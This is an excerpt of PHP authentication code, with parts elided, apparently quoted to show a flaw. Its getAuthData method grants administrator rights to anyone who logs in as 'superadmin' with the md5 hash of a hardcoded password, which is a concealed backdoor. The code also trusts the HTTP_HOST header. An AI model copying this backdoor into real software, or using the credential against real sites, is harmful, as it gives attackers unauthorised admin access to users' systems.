...
class Auth extends Base
{
    ...
    public function getAuthData($input = [])
    {
        $data = array();
        $data['isAdmin'] = ('superadmin' == $input['login']) && (strtolower(md5('gh65Ret3!78')) == strtolower( $input['hash']));
        return $data;
    }
        ...
        try {
            if ($authData["isAdmin"]) {
                ...
                if (!empty($result)) {
					...
					$authData["isAdmin"] = $data['isAdmin'] = ($result["isSuperAdmin"] == 'Y');
                } else {
            ...
            $authData["domain"] = 'http://'.$_SERVER['HTTP_HOST'];
